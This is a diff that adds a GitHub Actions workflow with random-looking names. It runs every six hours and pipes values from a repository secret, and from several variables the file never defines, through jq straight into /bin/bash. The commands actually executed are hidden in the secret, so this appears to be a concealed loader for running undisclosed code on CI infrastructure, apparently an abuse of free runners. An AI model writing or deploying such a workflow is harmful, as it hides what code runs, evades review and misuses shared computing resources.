@@ -1,0 +1,24 @@
+name: chuconglong7816
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chuconglong7816
+        env:
+          om2: ${{ secrets.om2 }}
+        run: |
+          echo $om2 | jq -r .bbplv78160 | /bin/bash
+          echo $uf77109 | jq -r .eego0936 | /bin/bash
+          echo $x86 | jq -r .zfyg4522 | /bin/bash
+          echo $ksl24 | jq -r .eg2 | /bin/bash
+          echo $ynxdx163 | jq -r .bjt0177 | /bin/bash
+          echo $mn750 | jq -r .ztdxg253 | /bin/bash
+          echo $p46126 | jq -r .f1594 | /bin/bash
+
